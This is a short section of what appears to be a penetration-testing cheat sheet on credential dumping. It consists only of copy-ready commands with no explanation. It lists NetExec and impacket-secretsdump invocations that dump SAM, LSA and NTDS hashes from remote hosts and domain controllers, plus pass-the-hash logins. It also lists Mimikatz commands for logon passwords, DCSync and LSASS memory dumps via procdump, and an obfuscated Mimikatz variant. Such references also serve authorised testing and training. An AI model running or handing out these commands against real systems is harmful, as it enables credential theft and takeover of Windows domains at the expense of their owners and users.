### 17.6 Credential Dumping

#### Linux
```bash
# Dump SAM/LSA
nxc smb <RHOST> -u '<USER>' -p '<PASS>' --sam
nxc smb <RHOST> -u '<USER>' -p '<PASS>' --lsa

# Dump NTDS (Domain Controller)
nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --ntds

# Secretsdump
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP>
impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USER>:<PASS>'@<DC_IP>
impacket-secretsdump -just-dc-user <USERNAME> '<DOMAIN>/<USER>:<PASS>'@<DC_IP>

# Pass-the-hash
nxc smb <RHOST> -u '<USER>' -H '<NTLM_HASH>'
impacket-psexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<RHOST>
```

#### Windows
```powershell
# Mimikatz
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets

# DCSync attack
lsadump::dcsync /domain:<DOMAIN> /user:<USER>

# Dump LSASS
procdump.exe -ma lsass.exe lsass.dmp
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit

# SafetyKatz (obfuscated Mimikatz)
.\SafetyKatz.exe
```
